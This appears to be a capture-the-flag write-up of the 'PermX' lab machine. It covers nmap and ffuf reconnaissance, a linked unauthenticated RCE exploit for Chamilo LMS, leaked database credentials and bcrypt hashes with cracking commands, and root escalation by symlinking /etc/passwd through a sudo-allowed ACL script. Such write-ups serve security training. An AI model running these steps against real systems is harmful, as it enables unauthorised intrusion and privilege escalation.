
# NMAP 

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 08:54 CDT
Nmap scan report for 10.129.197.234
Host is up (0.0094s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds

```

> Found nothing on http://permx.htb, so I enumerated subdomains using ffuf
> 
```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18
```

```shell
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 45ms]

```

> Found email address on lms.permx.htb `admin@permx.htb`

> the subdomain uses **chamilo lms** v1.11 from lms.permx.htb/documentation

> it has a [CVE](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) that allows RCE on unauthenticated users 

> found sql credentials

```shell
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';

```

>db_password also works on the user mtz

> found credentials on the mariaDB

```shell
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |
| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |
+----------+--------------------------------------------------------------+

```

## password cracking using hashcat and john

```shell
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.
txt 
```

> no cracked password
# mtz user can run opt/acl.sh as root

```shell
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```
# acl.sh file
```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

```
> created a link from /etc/passwd to /home/mtz/passwd. then used the acl.sh to change permission on the linked file so that we can edit /etc/passwd to add our password on the root user 

```shell
ln -s /etc/passwd passwd
sudo /opt/acl.sh mtz rw /home/mtz/passwd

# Generated a passwd format password
openssl passwd test

```

> replaced the "x" on the root 

```shell
root:x:0:0:root:/root:/bin/bash
```

> switched user using `su`, gained shell